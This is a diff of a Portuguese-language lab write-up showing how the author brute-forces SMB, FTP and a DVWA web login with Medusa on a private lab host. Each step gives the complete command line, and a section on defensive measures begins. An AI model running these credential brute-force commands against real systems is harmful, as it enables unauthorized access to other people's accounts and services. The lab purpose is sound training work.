@@ -27,7 +27,7 @@ Iniciei o laboratório criando listas de usuários e senhas contendo credenciais
 
 ### 2. Ataque ao Serviço SMB (Portas 139/445)
 Utilizei o módulo `smbnt` do Medusa para realizar o brute force contra o serviço de compartilhamento de arquivos.
-- **Comando:** `medusa -h 192.168.56.102 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M smbnt`
+- **Comando:** `medusa -h 192.168.56.102 -U usuarios.txt -P senhas.txt -M smbnt`
 
 **Resultado (Senha Encontrada):**
 ![Sucesso SMB](./imagens/02-medusa-smbnt.png)
@@ -42,7 +42,7 @@ Após encontrar a senha, validei o acesso listando os compartilhamentos do servi
 
 ### 3. Ataque ao Serviço FTP (Porta 21)
 O mesmo processo foi aplicado ao protocolo FTP para demonstrar a vulnerabilidade em múltiplos serviços.
-- **Comando:** `medusa -h 192.168.56.102 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M ftp`
+- **Comando:** `medusa -h 192.168.56.102 -U usuarios.txt -P senhas.txt -M ftp`
 
 **Resultado (Senha Encontrada):**
 ![Sucesso FTP](./imagens/04-medusa-ftp.png)
@@ -54,6 +54,20 @@ Login realizado com sucesso no servidor de arquivos via terminal.
 ![Acesso FTP](./imagens/05-validacao-ftp.png)
 
 ---
+
+### 4. Ataque a Aplicação Web (DVWA)
+O Medusa também foi utilizado para realizar o brute force no formulário de login do DVWA.
+- **Comando:** ```bash
+medusa -h 192.168.56.102 -U usuarios.txt -P senhas.txt -M http \
+-m PAGE: "/dvwa/login.php" \
+-m FORM: "username=^USER^&password=^PASS^&Login=Login" \
+-m "FAIL=Login failed" -t 6 ```
+
+**Resultado Medusa Web:**
+![Sucesso Web](./imagens/06-medusa-web.png)
+
+**Login Efetuado com Sucesso:**
+![Acesso Web](./imagens/07-validacao-web.png)
 
 ## 🛡️ Conclusões e Medidas de Defesa
 A execução deste laboratório permitiu compreender como senhas fracas e protocolos mal configurados facilitam a intrusão. Para mitigar esses riscos, recomenda-se:
